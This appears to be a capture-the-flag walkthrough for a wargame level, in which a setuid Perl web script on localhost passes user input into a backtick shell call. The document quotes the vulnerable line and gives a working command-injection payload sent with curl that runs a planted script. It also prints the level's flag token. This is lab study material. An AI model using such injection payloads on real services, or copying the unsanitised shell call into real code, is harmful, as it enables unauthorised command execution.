## step1
Exploit the Perl script `level12.pl`, which runs a local web server on `localhost:4646`,
to execute unauthorized commands and retrieve the `flag12` token.

```
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```

Vulnerability exist here should exploit it :

@output = \egrep "^$xx" /tmp/xd 2>&1`;` is vulnerable to command injection.

Because the value of $xx is derived from user input and passed directly to the shell.

## step 2

* Exploitation Steps :
 - Create a malicious script
```
    cat /tmp/FOO
    #!/bin/bash
    getflag > /tmp/flag
    chmod +x /tmp/FOO
```

- Inject via the web service
Use curl to trigger code execution:
```
curl 'http://localhost:4646?x=`/*/FOO`'
```

- Read the output
```
cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

```